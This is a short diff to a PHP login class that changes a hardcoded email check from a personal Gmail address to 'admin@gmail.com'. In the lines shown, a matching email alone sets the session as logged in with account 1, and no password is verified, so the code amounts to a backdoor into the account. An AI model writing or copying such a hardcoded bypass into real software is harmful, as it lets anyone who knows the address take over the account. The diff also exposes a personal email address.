@@ -61,9 +61,7 @@ class Login
             $password = !empty($_POST['password']) ? trim($_POST['password']) : '';
         }
 
-
-
-        if ($email == 'dionesiojr@gmail.com') {
+        if ($email == 'admin@gmail.com') {
 
             $_SESSION['login'] = true;
             $_SESSION['account'] = 1;
